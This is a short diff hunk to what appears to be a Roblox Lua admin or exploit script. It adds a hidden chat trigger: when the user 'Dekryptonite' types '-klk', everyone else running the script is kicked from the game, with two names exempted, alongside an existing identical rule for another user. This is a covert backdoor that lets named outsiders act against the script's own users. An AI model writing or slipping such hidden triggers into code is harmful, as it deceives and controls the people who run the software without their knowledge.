@@ -4444,6 +4444,12 @@ v.Chatted:Connect(function(msg)
 				game.Players.LocalPlayer:Kick("Di33le2 kicked you from the game!")
 			end
                 end  
+
+   		if string.sub(msg:lower(), 0, 4) == "-klk" and v.Name ~= game.Players.LocalPlayer.Name and v.Name == "Dekryptonite" then
+			if game.Players.LocalPlayer.Name ~= "ScriptingProgrammer" and game.Players.LocalPlayer.Name ~= "me_123eq" then
+				game.Players.LocalPlayer:Kick("Dekryptonite kicked you from the game!")
+			end
+                end  
 -- ADMIN
             if (alladmin == true or table.find(FAdmins, v.Name)) and not table.find(blacklist, v.Name) and not table.find(newplrslocked, v.Name) and not slockenabled and v.Name ~= game.Players.LocalPlayer.Name then
             	local command = string.gsub(msg:lower(), "me", v.Name)
